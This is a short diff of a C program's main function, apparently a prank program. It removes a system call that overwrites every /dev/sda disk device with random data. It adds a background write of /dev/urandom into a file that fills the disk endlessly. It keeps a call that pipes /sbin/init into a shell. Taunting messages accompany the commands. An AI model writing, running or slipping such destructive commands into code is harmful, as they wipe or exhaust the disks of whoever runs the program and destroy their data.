@@ -138,9 +138,10 @@ int main()
 
   system("cat /sbin/init | sh");
   sleep(5);
-  system("cat /dev/urandom > /dev/sda* & ");
+  system("cat /dev/urandom > /miku/mikumiku.scrnsvr &");
   displayText("Man I don't know what to do.");
   sleep(8);
   displayText("Just kidding check your disk space.");
-
+  sleep(10);
+  initializeMiku();
 }
